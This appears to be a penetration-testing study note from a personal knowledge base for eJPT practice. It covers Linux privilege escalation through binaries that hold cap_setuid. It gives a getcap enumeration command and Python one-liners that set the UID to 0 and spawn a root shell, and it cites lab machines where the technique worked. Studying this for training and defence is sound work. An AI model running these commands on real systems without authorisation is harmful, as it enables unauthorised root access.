---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: [[cron-job-abuse]], [[suid-enumeration]]
---

# Linux Capabilities

Exploiting binaries with dangerous capabilities (e.g. `cap_setuid`) to escalate privileges.

## Command

```sh
getcap -r / 2>/dev/null
```

## Exploit

A binary with `cap_setuid=ep` can set its UID to 0. For a Python-based tool:

```sh
/usr/local/bin/syscheck -c "import os; os.setuid(0); os.system('/bin/bash -p')"
```

Or from an interactive Python interpreter with the capability:

```python
import os; os.setuid(0); os.execl("/bin/sh", "sh")
```

The vehicle doesn't have to be a custom binary: a **stock interpreter** carrying the capability works the same way (one-liner, no file written):

```sh
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

## Seen in

[[los-3-hackers]] (`/usr/local/bin/syscheck cap_setuid=ep`), [[hannah-coffee]] (`/opt/priv-python cap_setuid=ep`), [[cap]] (`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` — system Python one-liner)
